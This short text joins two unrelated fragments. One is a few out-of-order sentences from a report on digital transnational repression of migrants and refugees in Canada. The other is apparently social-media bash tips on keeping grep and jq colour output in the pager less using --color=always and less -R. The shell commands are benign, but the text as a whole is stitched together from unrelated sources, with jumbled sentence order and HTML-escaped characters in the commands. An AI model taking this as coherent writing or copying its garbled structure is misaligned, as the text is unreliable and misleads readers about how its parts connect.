This lack of support is troubling, considering that the Trudeau government purports to welcome migrants and refugees to Canada and has made the promotion of democracy and human rights a cornerstone of its political platform.
We conclude that digital transnational repression has a serious impact on these communities, including their ability to undertake transnational advocacy work related to human rights. Yet, there is little support for victims and policy efforts to date have been insufficient.
Relying on a series of interviews with targets, the report investigates the political, legal, and psychosocial elements of digital transnational repression.

E.g., this will highlight matches in red:&lt;foo.log grep 'success|$' -EPiping that to less(1), though, makes the color go away and defeats the purpose. This will highlight and put it in a pager, still with color:&lt;foo.log grep 'success|$' -E --color=always | less -R
Lots of tools (including grep and jq) can colorize their output but disable color if their stdout is a pipe. Usually they'll have a flag to force color output ("grep --color=always" and "jq -C") specifically for this use case.
I've mentioned "less -R" in passing in a couple of #bashTricks threads, but I think it deserves more attention. The -R flag tells less(1) to output raw bytes instead of printing escapes for things like color changes. This lets your terminal show colors in a pager!
